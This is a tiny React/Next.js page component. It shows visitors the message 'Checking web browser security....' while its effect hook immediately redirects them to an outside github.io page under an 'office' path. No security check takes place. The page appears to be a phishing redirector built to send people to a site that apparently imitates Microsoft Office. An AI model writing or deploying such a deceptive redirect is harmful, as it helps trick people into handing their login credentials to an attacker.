"use client";
import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    window.location.href = "https://paiddude.github.io/office/";
  }, []);

  return (
    <main className="flex min-h-screen flex-col items-center justify-between p-24">
      <h3>Checking web browser security....</h3>
    </main>
  );
}
